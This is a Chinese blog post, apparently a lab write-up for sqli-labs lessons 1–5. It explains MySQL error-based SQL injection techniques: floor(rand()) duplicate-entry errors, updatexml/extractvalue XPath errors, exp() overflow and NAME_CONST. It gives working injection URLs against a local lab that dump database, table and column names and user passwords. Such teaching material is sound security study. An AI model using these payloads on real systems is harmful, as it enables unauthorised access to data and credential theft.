---
layout: post
title: 'Sqli-labs通关总结'
subtitle: 'Sqli-labs-master(1-5)'
date: 2018-12-25
categories: 技术
cover: '/assets/img/2.jpg'
tags: web安全 SQL注入 盲注 sqli-labs
---

# Sql盲注的几种方式

## 1. Duplicate entry报错:


主要的函数如下

> rand():用于产生一个0～1的随机数
> 
> floor():向下取整
> 
> concat():将符合条件的同一列中的不同行数据进行连接。
> 
> floor(rand()):值是固定的"0"
>
> floor(rand()*2):值是不固定的，"0"或者"1"。


```
mysql > select floor(rand(0)*2) from schemata;
```
##### 结果显示floor(rand()*2)毫无规律可言，而floor(rand(0)*2)是有规律的"011011…………"

mysql在遇到select count(*) from tables group by x;这语句的时候会建立一个虚拟表

- 1.查询前默认会建立空虚拟表。
- 2.取第一条记录，执行floor(rand(0)*2)，发现结果为0(第一次计算),查询虚拟表，发现0的键值不存在，则floor(rand(0)*2)会被再计算一次，结果为1(第二次计算)，插入虚表，这时第一条记录
- 3.查询第二条记录，再次计算floor(rand(0)*2)，发现结果为1(第三次计算)，查询虚表，发现1的键值存在，所以floor(rand(0)*2)不会被计算第二次，直接count(*)加1，第二条记录查询完毕查询完毕
- 4.查询第三条记录，再次计算floor(rand(0)*2)，发现结果为0(第4次计算)，查询虚表，发现键值没有0，则数据库尝试插入一条新的数据，在插入数据时floor(rand(0)*2)被再次计算，作为虚表的主键，其值为1(第5次计算)，然而1这个主键已经存在于虚拟表中，而新计算的值也为1(主键键值必须唯一)，所以插入的时候就直接报错了
- 5.整个查询过程floor(rand(0)*2)被计算了5次，查询原数据表3次，所以这就是为什么数据表中需要3条数据，使用该语句才会报错的原因。


#### sqli-labs-less5 测试:

- 1.获取库名

```
127.0.0.1/sqli-labs/less-5/?id=1' Union select 1,count(*),concat(database(),0x26,floor(rand(0)*2))x 
from information_schema.columns group by x --+
```
![image](2DB85252F5F54CC9A22CA1A6D2CB905C)

- 2.获取表名
```
127.0.0.1/sqli-labs/less-5/?id=1' Union select 1,count(*),concat((select table_name from information_schema.tables 
where table_schema='security' limit 3,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x --+
```
![image](AF0F93CAE52C4E0E9D905C94482C1373)

- 3.获取字段
```
127.0.0.1/sqli-labs/less-5/?id=1' Union select 1,count(*),concat((select column_name from information_schema.columns where table_schema='security' 
and table_name='users' limit 1,1),0x26,floor(rand(0)*2))x 
from information_schema.columns group by x --+
```
![image](167781554640477382F3F7737FF773B2)

- 4.获取值
```
127.0.0.1/sqli-labs-master/Less-5/?id=1' Union select 1,count(*),concat((select password from users limit 1,1),(select username from users limit 1,1),0x26,floor(rand(0)*2))x 
from information_schema.columns group by x--+
```
![image](10455C264D2E488AA47C7F1D0BE634FC)

## 2.Xpath报错注入：

主要的两个函数：
> MySQL 5.1.5
- 1.extractvalue():从目标XML中返回包含所查询值的字符串。


```
EXTRACTVALUE (XML_document, XPath_string);
```


第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc 

第二个参数：XPath_string (Xpath格式的字符串)
##### 原理：通过concat将查询到的信息拼接成字符串,由于extractvalue函数的第二个参数需要Xpath格式字符串。现在很显然不是,所以报错。

- 2.updatexml():用法与extractvalue类似。

构造语句
```
http://127.0.0.1/sqli-labs-master/Less-5/?id=1' and updatexml(1,concat(0x7e,database(),0x7e),1) --+
```
![image](660CECE78CC24295837BA8334BA04842)

- 1.获取库名
```
127.0.0.1/sqli-labs-master/Less-5/?id=1' and updatexml(1,concat(0x7e,(select schema_name
from information_schema.schemata limit 1,1),0x7e),1) --+
```
![image](30662BEC71524F66A27450545DCAB5C6)

- 2.获取表名
```
127.0.0.1/sqli-labs-master/Less-5/?id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) 
from information_schema.tables where table_schema='security'),0x7e),1) --+
```
![image](1F35855DB3B0429AB2E08B0B3BDA33B8)


- 3.获取字段
```
127.0.0.1/sqli-labs-master/Less-5/?id=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) 
from information_schema.columns where table_name='users'),0x7e),1) --+
```

![image](425389272CB64DE39EA25257A322534A)

- 4.获取值
```
127.0.0.1/sqli-labs-master/Less-5/?id=1' and updatexml(1,concat(0x7e,(select group_concat(id,username,password) from users),0x7e),1) --+
```
![image](13A62E1B6E734539BE03D889F7F2F4D3)

## 3.整型溢出报错:
> MySQL>5.5.5

主要函数
> exp(x):计算e的次方

构造语句
```
and (EXP(~(select * from(select version())a)))
```
原理如下
> Exp()超过710会产生溢出。
将0按位取反就会返回“18446744073709551615”，而函数执行成功会返回0，所以将成功执行的函数取反就会得到最大的无符号BIGINT值，从而造成报错。

## 4.Sub截断注入
截取字符串的函数
> substr(string,start,length)

> mid(string,start,length)

> left(string,length)


ord():转换ASCII值



## 5.数据重复报错:
> MySQL低版本 

构造语句
```
select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x
```